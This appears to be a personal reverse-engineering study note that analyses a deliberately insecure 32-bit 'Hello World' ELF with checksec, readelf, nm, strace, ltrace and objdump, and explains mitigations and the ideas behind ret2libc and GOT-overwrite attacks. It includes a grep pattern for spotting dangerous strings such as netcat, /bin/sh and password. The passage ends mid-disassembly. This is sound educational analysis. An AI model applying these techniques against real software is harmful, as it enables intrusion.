# 32 Bit

## Vulnerable

#### File
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ file 32bit_InSecure_hello_world 
32bit_InSecure_hello_world: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=68bb5da9e18fcfccb773a34611d60ff2ca4b414b, for GNU/Linux 3.2.0, not stripped
```
- **ELF 32-bit LSB**
	- 32 bit, so we will be dealing with registers like EAX, EBP, ESP, EIP etc..,
	- LSB, uses little endian byte order
- i386
	- uses the x86 (32 bit) architecture
- Dynamically linked
	- The program uses shared libraries that are loaded at the runtime
- interpreter /lib/ld-linux.so.2 
	- dynamic linker that loads the shared libraries when the program starts
- not stripped
	- Binary contains symbol tables, which includes names of the functions and variables

#### checksec
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ pwn checksec 32bit_InSecure_hello_world 
[*] '/home/kali/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build/32bit_InSecure_hello_world'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
- Arch - its a 32 bit x86 binary
- RELRO
	- Relocation Read-Only, is a mitigation strategy making parts of the binary `read-only` after loading it
	- When RELRO is not available, the Global Offset Table (GOT) is writable
	- A GOT Overwrite attack will be possible if a vulnerability that lets the attacker to `write to the memory`
	- It is achieved by overwriting the function pointers in the GOT to hijack the control flow.
- Stack
	- Canaries are special values placed on the stack to detect buffer overflows
	- Absence of canaries will allow an attacker to overflow the buffer on a stack and helps to overwrite the saved return address values
- NX
	- Stack Executable (No-eXecute) bit, prevents the code from being executed from the stack
	- Together with absence of Stack canaries, an attacker can trigger buffer overflow with ease
- PIE
	- Position Independent Executable, randomises the base address of the executable in the memory
	- When absent, the executable is always loaded at the same address and is easier to develop the exploit
- RWX
	- Memory segments that are readable, writable and executable are found in the binary

#### ldd
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ ldd ./32bit_InSecure_hello_world 
        linux-gate.so.1 (0xf7f73000)
        libc.so.6 => /lib32/libc.so.6 (0xf7d13000)
        /lib/ld-linux.so.2 (0xf7f75000)
```
- Outputs the libraries the executable depends on
- linux-gate.so.1
	- virtual library by kernel for effective system calls
- libc.so.6 => /lib32/libc.so.6 (0xf7d13000)
	- shows that the binary is linked against the standard C library, `libc`
	- libc contains multiple functions that are handy when exploiting: `system()`, `execve()`, `strcpy()` etc..,
	- 0xf7d13000, is the base address where `libc` is loaded in the memory for this specific execution
	- On most modern systems, because of ASLR (Address Space Layout Randomisation) the base address of the libc will vary for each execution
- /lib/ld-linux.so.2
	- dynamic linker that is responsible for loading libc and other shared libraries into the memory

>[!NOTE]
> - In modern secure binaries, we cannot directly jump to our shell code, a method called `ret2libc` (return-to-libc) is used
> - ret2libc workflow
> 	- Overflow the stack buffer -> overwrite the saved return values with `system()` inside libc -> placing a pointer to the string `/bin/sh` on the stack and pass it as an argument to the `system()`
> - A successful exploitation would require
> 	- the address of libc in memory
> 	- As ASLR randomizes, first a memory leak vulnerability is required to find out where libc is loaded
> 	- Then the calculation of the `system()` in libc is required to successfully exploit this

#### grep
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ strings 32bit_InSecure_hello_world | grep --color=always -E '(gets|strcpy|strcat|sprintf|scanf|sscanf|fscanf|printf|fprintf|snprintf|vprintf|system|exec|execl|execv|execle|ls|nc|whoami|netcat|/bin/sh|/bin/bash|cat|debug|secret|test|login|hidden|root|admin|key|password|%s|%x|%p|%n|socket|connect|send|recv|listen)'

printf
printf@GLIBC_2.0
_dl_relocate_static_pie
```
- Strings and grep was able to identify potentially vulnerable functions, just the existence of this functions does not necessarily mean that memory corruption issue exists

#### readelf
```bash
# elf metadata
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -h 32bit_InSecure_hello_world 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8049050
  Start of program headers:          52 (bytes into file)
  Start of section headers:          10148 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         11
  Size of section headers:           40 (bytes)
  Number of section headers:         29
  Section header string table index: 28
```
- Data
	- Confirms the byte order
- Entry point address
	- The most important piece of information here
	- It is the virtual memory address of the very first instruction when the application is loaded
	- This is **not** the address of the `main()`, the entry point is a small initialization function (often called as `_start`) which is provided by C runtime.
	- The `_start` function setups up the env for the C program like preparing argc, argv and then calls the `main()`
	- When the application is loaded on the debuggers like `GDB`, it wil usually stop at the entry point address by default.
- Start of Program header
	- `readelf -l`, tells the OS how to create the process image in the memory (i.e., what parts of the file to map as executable code and what as writable data)
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -l 32bit_InSecure_hello_world 

Elf file type is EXEC (Executable file)
Entry point 0x8049050
There are 11 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00160 0x00160 R   0x4
  INTERP         0x0001b8 0x080481b8 0x080481b8 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x002e8 0x002e8 R   0x1000
  LOAD           0x001000 0x08049000 0x08049000 0x001bc 0x001bc R E 0x1000
  LOAD           0x002000 0x0804a000 0x0804a000 0x00130 0x00130 R   0x1000
  LOAD           0x002130 0x0804b130 0x0804b130 0x00110 0x00114 RW  0x1000
  DYNAMIC        0x002138 0x0804b138 0x0804b138 0x000e8 0x000e8 RW  0x4
  NOTE           0x000194 0x08048194 0x08048194 0x00024 0x00024 R   0x4
  NOTE           0x002110 0x0804a110 0x0804a110 0x00020 0x00020 R   0x4
  GNU_EH_FRAME   0x002014 0x0804a014 0x0804a014 0x00034 0x00034 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .note.gnu.build-id .interp .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt 
   03     .init .plt .text .fini 
   04     .rodata .eh_frame_hdr .eh_frame .note.ABI-tag 
   05     .init_array .fini_array .dynamic .got .got.plt .data .bss 
   06     .dynamic 
   07     .note.gnu.build-id 
   08     .note.ABI-tag 
   09     .eh_frame_hdr 
   10     
```

>[!NOTE]
> - These are the instructions for the OS on how to load the program into memory 
> - Program headers, describes a segment of binaries that will be mapped into the memory, important information are Type, VirtAddr(Virtual Address) and Flg (Flag permissions)
> - Type: LOAD, are the most important segments. As these represent the actual parts of the file that are loaded into the memory. These data can be grouped with permissions, R E (Read and Execute) segments are the code segment which contains the executable instructions (the `.text` section). The R W (Read and Write) segements are the data segment, where the global variables and other writable data are stored (.data and .bss sections).
> - INTERP, just points to a dynamic linker
> - GNU_STACK...Flg: RWE (Read, Write and Exectuable), most critical piece of information in the entire output as this line explicitly defines the permissions for the program's stack. This directly says that the NX protection is disabled
> - Section - Segment mapping, the output of this can be seen from `readelf -S` The segment 03 contains the .text (code) section an d segment 05 contains `.data` and `.got` sections

- Start of the Section header
	- `readelf -S`. describes the sections of the binary `.text` - code, `.data` - initialized data, `.rodata` - read only data etc..,
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -S 32bit_InSecure_hello_world 
There are 29 section headers, starting at offset 0x27a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.gnu.bu[...] NOTE            08048194 000194 000024 00   A  0   0  4
  [ 2] .interp           PROGBITS        080481b8 0001b8 000013 00   A  0   0  1
  [ 3] .gnu.hash         GNU_HASH        080481cc 0001cc 000020 04   A  4   0  4
  [ 4] .dynsym           DYNSYM          080481ec 0001ec 000050 10   A  5   1  4
  [ 5] .dynstr           STRTAB          0804823c 00023c 000057 00   A  0   0  1
  [ 6] .gnu.version      VERSYM          08048294 000294 00000a 02   A  4   0  2
  [ 7] .gnu.version_r    VERNEED         080482a0 0002a0 000030 00   A  5   1  4
  [ 8] .rel.dyn          REL             080482d0 0002d0 000008 08   A  4   0  4
  [ 9] .rel.plt          REL             080482d8 0002d8 000010 08  AI  4  22  4
  [10] .init             PROGBITS        08049000 001000 000020 00  AX  0   0  4
  [11] .plt              PROGBITS        08049020 001020 000030 04  AX  0   0 16
  [12] .text             PROGBITS        08049050 001050 000156 00  AX  0   0 16
  [13] .fini             PROGBITS        080491a8 0011a8 000014 00  AX  0   0  4
  [14] .rodata           PROGBITS        0804a000 002000 000014 00   A  0   0  4
  [15] .eh_frame_hdr     PROGBITS        0804a014 002014 000034 00   A  0   0  4
  [16] .eh_frame         PROGBITS        0804a048 002048 0000c8 00   A  0   0  4
  [17] .note.ABI-tag     NOTE            0804a110 002110 000020 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      0804b130 002130 000004 04  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      0804b134 002134 000004 04  WA  0   0  4
  [20] .dynamic          DYNAMIC         0804b138 002138 0000e8 08  WA  5   0  4
  [21] .got              PROGBITS        0804b220 002220 000004 04  WA  0   0  4
  [22] .got.plt          PROGBITS        0804b224 002224 000014 04  WA  0   0  4
  [23] .data             PROGBITS        0804b238 002238 000008 00  WA  0   0  4
  [24] .bss              NOBITS          0804b240 002240 000004 00  WA  0   0  1
  [25] .comment          PROGBITS        00000000 002240 00001e 01  MS  0   0  1
  [26] .symtab           SYMTAB          00000000 002260 000260 10     27  19  4
  [27] .strtab           STRTAB          00000000 0024c0 0001e1 00      0   0  1
  [28] .shstrtab         STRTAB          00000000 0026a1 000101 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), p (processor specific)
```
  
  >[!NOTE]
  >- Code and Read-Only Data (`.text`, `.rodata`, `.init`):
  >	- `.text`, is the most important section which contains actual executable code. `AX` flag means its Allocated in memory and is Executable. When disassembled, these are the contents that we will be looking at
  >	- `.rodata`, contains Read-Only data, these sections contains read only data such as constant strings. The lack of `W` flag implies that the program cannot modify this data at runtime
  >	- `.init`, contains the initialisation and finalisation code that runs before `main` and after `main` exists, these are executable sections
>-  Dynamic Linking Information:
>	- Crucial sections for understanding how program interacts with the shared libraries
>	- `.interp`, specifies the path of the dynamic linker. These information are used by the Kernel to load the necessary shared libraries for the program
>	- `.dynsym`& `.dynstr`, dynamic symbols and strings table. Information related to the functions and variables that are imported from and exported to the shared libraries can be found in this section.
>	- `.rel.plt` & `.plt`, procedure linkage table and its associated relocations are used to lazily resolve the address of functions from shared libraries. i.e., when the `printf` is called by the program for the first time, the real address of the `printf` is found from the `libc` and patches it in for future calls. This is the foundation for attacks like a `GOT Overwrite`
>- Writable Sections:
>	- Primary target for memory corruption issues because of the presence of `WA` flags
>	- `.data` sections stores the initialized global and static variables
>	- `.bss` sections is used for uninitialized global and static variables, the `NOBITS` type mean it does not take up any space in the file itself but it is allocated in memory. The `OS` zeros it out when the program is loaded
>	- `.got` & `.got.plt`, The Global Offset Table, one of the most critical sections for exploit development
>	- `.got.plt` contains the actual pointers to functions in shared libraries, when a GOT overwrite attack, an address within this section will be written to hijack the control flow
>- Symbol and Debug Information
>	- `.symtab` & `.strtab`, the symbol table and its corresponding string table.
>	- These contain information about `all` symbols in the binary, including function names, variable names and file names
>	- When a binary is `stripped`, these sections are removed from the binary.

#### Signature check
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ readelf -S 32bit_InSecure_hello_world | grep -i -E 'sig|sign|cert|auth'
```
- The ELF binary is not signed with any certificate
>[!NOTE]
>- A signed binary will have a new section in the binary with the name matching any of the matching patters `sig/sign/cert/auth`
>- The section can be dumped with `objcopy --dump-section .<sectionName>=signature.bin binaryName`
>- Once the signature section is dumped, the contents can viewed with the utilities like `openssl`: `openssl pkcs7 -inform DER -in signature.bin -print_certs -text -noout`

#### nm / nm -D
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ nm -D 32bit_InSecure_hello_world    
         w __gmon_start__
0804a004 R _IO_stdin_used
         U __libc_start_main@GLIBC_2.34
         U printf@GLIBC_2.0
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ nm 32bit_InSecure_hello_world    
0804a110 r __abi_tag
0804b240 B __bss_start
0804b240 b completed.0
0804b238 D __data_start
0804b238 W data_start
080490b0 t deregister_tm_clones
08049090 T _dl_relocate_static_pie
08049130 t __do_global_dtors_aux
0804b134 d __do_global_dtors_aux_fini_array_entry
0804b23c D __dso_handle
0804b138 d _DYNAMIC
0804b240 D _edata
0804b244 B _end
080491a8 T _fini
0804a000 R _fp_hw
08049160 t frame_dummy
0804b130 d __frame_dummy_init_array_entry
0804a10c r __FRAME_END__
0804b224 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804a014 r __GNU_EH_FRAME_HDR
08049000 T _init
0804a004 R _IO_stdin_used
         U __libc_start_main@GLIBC_2.34
08049166 T main
         U printf@GLIBC_2.0
080490f0 t register_tm_clones
08049050 T _start
0804b240 D __TMC_END__
0804907d t __wrap_main
080491a2 T __x86.get_pc_thunk.ax
080490a0 T __x86.get_pc_thunk.bx                                             
```
- The utility `nm` is used to list symbols from the object files. 
- The `-D` flag shows the dynamic symbols which are linked at run time.
- The `nm -D` specifically shows the symbols that are resolved by the dynamic linker at runtime.
	- `w` from the output shows that it is a weak symbol related to `grpof`, a profiling tool
	- `U` from the output shows that this is an undefined symbol. 
	- The `__libc_start_main@GLIBC_2.34` from the output means that this function is not defined within the binary but is expected to found in an external shared library (specifically GLIBC_2.34 or compatible), this function is crucial as it is called by the **`program's entry point`** to setup the C runtime environment and eventually call the main function
	- Undefined symbols are critical as the addresses of these functions are resolved during runtime and are stored in the GOT, overwriting the entries in the GOT for the functions is a common technique to hijack program execution
- The output of `nm <binary>` shows comprehensive list including both static and dynamic symbols as well as internal functions and data.
	- Program Entry and Exit Points;
		- `_start` is the absolute entry point of the executable and is the very first instruction executed when the program runs, the `T` indicates that it is present in the `.text`section
		- `main` is the main logic of the C Program
		- `_init` & `_fini`, initialization function that runs before main and finalization function that runs after the main completes
	- External Library functions;
		- Same as above, identified with `U`
	- Global Data Sections; - `Potential targets for overwrites`
		- `__data_start` & `data_start`, these marks the beginning of the `.data` section which holds all the **initialized global and static variables;**
			- `D`, initialized data section
			- `W`, weak symbol
		- `__bss_start`, marks the beginning of the `.bss` section, which holds **uninitialized global and static variables**;
			- `B`, available in the `.bss` section
		- `B _end`, marks the end of the `.bss` section and end of the program's data segments
		- `_GLOBAL_OFFSET_TABLE_`, the Global offset Table (`GOT`) itself, whose address is crucial for `GOT Overwrite Attacks`
		- These contains pointers to dynamically linked functions
			- `d`, indicates that it is in the initialized data section
	- Internal Functions;
		- `deresgister_tm_clones`,`__do_global_dtors_aux` & `register_tm_clones`m internal functions often realted to C++ global constructors and deconstructors or thread-local storage
			- `t`, indicates that its in the `.text` section
		- `__wrap_main`, an interesting function that suggests that the main function is wrapped by another function, possibly for debugging, profiling or specific linking behaviour
		- `__x86.get_pc_thunk.ax` & `__x86.get_pc_thunk.bx`, the thunk functions used to get the current program counter `PC` in position-independent code `PIC`. The presence of these code strongly suggest that either `PIE` is enabled or the program is compiled with `PIC-Compatiable` code generation
	- Read Only data:
		- `__abi_tag`, a read only data symbol
		- `_IO_stdin_used` is a function originated from the standard I/O library, which signifies that a component related to standard input operations
		- `_fp_hw`, a read-only symbol likely related to floating point
		- `__FRAME_END__` & `__GNU_EH_FRAME_HDR`, Read-only data symbols related to exception handling and stack unwinding

#### strings
```bash
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ strings 32bit_InSecure_hello_world | grep --color=always -E '(gets|strcpy|strcat|sprintf|scanf|sscanf|fscanf|printf|fprintf|snprintf|vprintf|system|exec|execl|execv|execle|ls|nc|whoami|netcat|/bin/sh|/bin/bash|cat|debug|secret|test|login|hidden|root|admin|key|password|%s|%x|%p|%n|socket|connect|send|recv|listen)'

printf
printf@GLIBC_2.0
_dl_relocate_static_pie
```
- Looking for presence of readable ascii characters on the binary.

#### strace / ltrace
```bash
# system calls trace
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ strace ./32bit_InSecure_hello_world   
execve("./32bit_InSecure_hello_world", ["./32bit_InSecure_hello_world"], 0x7fffda8f94e0 /* 56 vars */) = 0
[ Process PID=2863 runs in 32 bit mode. ]
brk(NULL)                               = 0x8f80000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7f98000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=103355, ...}) = 0
mmap2(NULL, 103355, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7f7e000
close(3)                                = 0
openat(AT_FDCWD, "/lib32/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0O\2\0004\0\0\0"..., 512) = 512
statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0755, stx_size=2315004, ...}) = 0
mmap2(NULL, 2349360, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d40000
mmap2(0xf7d63000, 1609728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0xf7d63000
mmap2(0xf7eec000, 544768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ac000) = 0xf7eec000
mmap2(0xf7f71000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x231000) = 0xf7f71000
mmap2(0xf7f74000, 39216, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f74000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7f994c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
set_tid_address(0xf7f99528)             = 2863
set_robust_list(0xf7f9952c, 12)         = 0
rseq(0xf7f99440, 0x20, 0, 0x53053053)   = 0
mprotect(0xf7f71000, 8192, PROT_READ)   = 0
mprotect(0xf7fd6000, 8192, PROT_READ)   = 0
ugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
munmap(0xf7f7e000, 103355)              = 0
statx(1, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFCHR|0600, stx_size=0, ...}) = 0
getrandom("\xec\xd8\x6f\x95", 4, GRND_NONBLOCK) = 4
brk(NULL)                               = 0x8f80000
brk(0x8fa1000)                          = 0x8fa1000
brk(0x8fa2000)                          = 0x8fa2000
write(1, "Hello World", 11Hello World)             = 11
exit_group(0)                           = ?
+++ exited with 0 +++                          
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ ltrace ./32bit_InSecure_hello_world 
__libc_start_main(["./32bit_InSecure_hello_world"] <unfinished ...>
printf("Hello World")                                                                           = 11
Hello World+++ exited (status 0) +++
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ objdump -s --section .rodata ./32bit_InSecure_hello_world 

./32bit_InSecure_hello_world:     file format elf32-i386

Contents of section .rodata:
 804a000 03000000 01000200 48656c6c 6f20576f  ........Hello Wo
 804a010 726c6400                             rld.            
# assembly instructions
┌──(kali㉿kali)-[~/Desktop/Reverse-Engineering-Files/00_Hello World/linux_Build]
└─$ objdump -d ./32bit_InSecure_hello_world 
./32bit_InSecure_hello_world:     file format elf32-i386


Disassembly of section .init:

08049000 <_init>:
 8049000:	53                   	push   %ebx
 8049001:	83 ec 08             	sub    $0x8,%esp
 8049004:	e8 97 00 00 00       	call   80490a0 <__x86.get_pc_thunk.bx>
 8049009:	81 c3 1b 22 00 00    	add    $0x221b,%ebx
 804900f:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 8049015:	85 c0                	test   %eax,%eax
 8049017:	74 02                	je     804901b <_init+0x1b>
 8049019:	ff d0                	call   *%eax
 804901b:	83 c4 08             	add    $0x8,%esp
 804901e:	5b                   	pop    %ebx
 804901f:	c3                   	ret

Disassembly of section .plt:

08049020 <__libc_start_main@plt-0x10>:
 8049020:	ff 35 28 b2 04 08    	push   0x804b228
 8049026:	ff 25 2c b2 04 08    	jmp    *0x804b22c
 804902c:	00 00                	add    %al,(%eax)
	...

08049030 <__libc_start_main@plt>:
 8049030:	ff 25 30 b2 04 08    	jmp    *0x804b230
 8049036:	68 00 00 00 00       	push   $0x0
 804903b:	e9 e0 ff ff ff       	jmp    8049020 <_init+0x20>

08049040 <printf@plt>:
 8049040:	ff 25 34 b2 04 08    	jmp    *0x804b234
 8049046:	68 08 00 00 00       	push   $0x8
 804904b:	e9 d0 ff ff ff       	jmp    8049020 <_init+0x20>

Disassembly of section .text:

08049050 <_start>:
 8049050:	31 ed                	xor    %ebp,%ebp
 8049052:	5e                   	pop    %esi
 8049053:	89 e1                	mov    %esp,%ecx
 8049055:	83 e4 f0             	and    $0xfffffff0,%esp
 8049058:	50                   	push   %eax
 8049059:	54                   	push   %esp
 804905a:	52                   	push   %edx
 804905b:	e8 19 00 00 00       	call   8049079 <_start+0x29>
 8049060:	81 c3 c4 21 00 00    	add    $0x21c4,%ebx
 8049066:	6a 00                	push   $0x0
 8049068:	6a 00                	push   $0x0
 804906a:	51                   	push   %ecx
 804906b:	56                   	push   %esi
 804906c:	8d 83 59 de ff ff    	lea    -0x21a7(%ebx),%eax
 8049072:	50                   	push   %eax
 8049073:	e8 b8 ff ff ff       	call   8049030 <__libc_start_main@plt>
 8049078:	f4                   	hlt
 8049079:	8b 1c 24             	mov    (%esp),%ebx
 804907c:	c3                   	ret

0804907d <__wrap_main>:
 804907d:	e9 e4 00 00 00       	jmp    8049166 <main>
 8049082:	66 90                	xchg   %ax,%ax
 8049084:	66 90                	xchg   %ax,%ax
 8049086:	66 90                	xchg   %ax,%ax
 8049088:	66 90                	xchg   %ax,%ax
 804908a:	66 90                	xchg   %ax,%ax
 804908c:	66 90                	xchg   %ax,%ax
 804908e:	66 90                	xchg   %ax,%ax

08049090 <_dl_relocate_static_pie>:
 8049090:	c3                   	ret
 8049091:	66 90                	xchg   %ax,%ax
 8049093:	66 90                	xchg   %ax,%ax
 8049095:	66 90                	xchg   %ax,%ax
 8049097:	66 90                	xchg   %ax,%ax
 8049099:	66 90                	xchg   %ax,%ax
 804909b:	66 90                	xchg   %ax,%ax
 804909d:	66 90                	xchg   %ax,%ax
 804909f:	90                   	nop

080490a0 <__x86.get_pc_thunk.bx>:
 80490a0:	8b 1c 24             	mov    (%esp),%ebx
 80490a3:	c3                   	ret
 80490a4:	66 90                	xchg   %ax,%ax
 80490a6:	66 90                	xchg   %ax,%ax
 80490a8:	66 90                	xchg   %ax,%ax
 80490aa:	66 90                	xchg   %ax,%ax
 80490ac:	66 90                	xchg   %ax,%ax
 80490ae:	66 90                	xchg   %ax,%ax

080490b0 <deregister_tm_clones>:
 80490b0:	b8 40 b2 04 08       	mov    $0x804b240,%eax
 80490b5:	3d 40 b2 04 08       	cmp    $0x804b240,%eax
 80490ba:	74 24                	je     80490e0 <deregister_tm_clones+0x30>
 80490bc:	b8 00 00 00 00       	mov    $0x0,%eax
 80490c1:	85 c0                	test   %eax,%eax
 80490c3:	74 1b                	je     80490e0 <deregister_tm_clones+0x30>
 80490c5:	55                   	push   %ebp
 80490c6:	89 e5                	mov    %esp,%ebp
 80490c8:	83 ec 14             	sub    $0x14,%esp
 80490cb:	68 40 b2 04 08       	push   $0x804b240
 80490d0:	ff d0                	call   *%eax
 80490d2:	83 c4 10             	add    $0x10,%esp
 80490d5:	c9                   	leave
 80490d6:	c3                   	ret
 80490d7:	90                   	nop
 80490d8:	2e 8d b4 26 00 00 00 	lea    %cs:0x0(%esi,%eiz,1),%esi
 80490df:	00 
 80490e0:	c3                   	ret
 80490e1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 80490e8:	2e 8d b4 26 00 00 00 	lea    %cs:0x0(%esi,%eiz,1),%esi
 80490ef:	00 

080490f0 <register_tm_clones>:
 80490f0:	b8 40 b2 04 08       	mov    $0x804b240,%eax
 80490f5:	2d 40 b2 04 08       	sub    $0x804b240,%eax
 80490fa:	89 c2                	mov    %eax,%edx
 80490fc:	c1 e8 1f             	shr    $0x1f,%eax
 80490ff:	c1 fa 02             	sar    $0x2,%edx
 8049102:	01 d0                	add    %edx,%eax
 8049104:	d1 f8                	sar    $1,%eax
 8049106:	74 20                	je     8049128 <register_tm_clones+0x38>
 8049108:	ba 00 00 00 00       	mov    $0x0,%edx
 804910d:	85 d2                	test   %edx,%edx
 804910f:	74 17                	je     8049128 <register_tm_clones+0x38>
 8049111:	55                   	push   %ebp
 8049112:	89 e5                	mov    %esp,%ebp
 8049114:	83 ec 10             	sub    $0x10,%esp
 8049117:	50                   	push   %eax
 8049118:	68 40 b2 04 08       	push   $0x804b240
 804911d:	ff d2                	call   *%edx
 804911f:	83 c4 10             	add    $0x10,%esp
 8049122:	c9                   	leave
 8049123:	c3                   	ret
 8049124:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 8049128:	c3                   	ret
 8049129:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

08049130 <__do_global_dtors_aux>:
 8049130:	f3 0f 1e fb          	endbr32
 8049134:	80 3d 40 b2 04 08 00 	cmpb   $0x0,0x804b240
 804913b:	75 1b                	jne    8049158 <__do_global_dtors_aux+0x28>
 804913d:	55                   	push   %ebp
 804913e:	89 e5                	mov    %esp,%ebp
 8049140:	83 ec 08             	sub    $0x8,%esp
 8049143:	e8 68 ff ff ff       	call   80490b0 <deregister_tm_clones>
 8049148:	c6 05 40 b2 04 08 01 	movb   $0x1,0x804b240
 804914f:	c9                   	leave
 8049150:	c3                   	ret
 8049151:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 8049158:	c3                   	ret
 8049159:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi

08049160 <frame_dummy>:
 8049160:	f3 0f 1e fb          	endbr32
 8049164:	eb 8a                	jmp    80490f0 <register_tm_clones>

08049166 <main>:
 8049166:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 804916a:	83 e4 f0             	and    $0xfffffff0,%esp
 804916d:	ff 71 fc             	push   -0x4(%ecx)
 8049170:	55                   	push   %ebp
 8049171:	89 e5                	mov    %esp,%ebp
 8049173:	53                   	push   %ebx
 8049174:	51                   	push   %ecx
 8049175:	e8 28 00 00 00       	call   80491a2 <__x86.get_pc_thunk.ax>
 804917a:	05 aa 20 00 00       	add    $0x20aa,%eax
 804917f:	83 ec 0c             	sub    $0xc,%esp
 8049182:	8d 90 e4 ed ff ff    	lea    -0x121c(%eax),%edx
 8049188:	52                   	push   %edx
 8049189:	89 c3                	mov    %eax,%ebx
 804918b:	e8 b0 fe ff ff       	call   8049040 <printf@plt>
 8049190:	83 c4 10             	add    $0x10,%esp
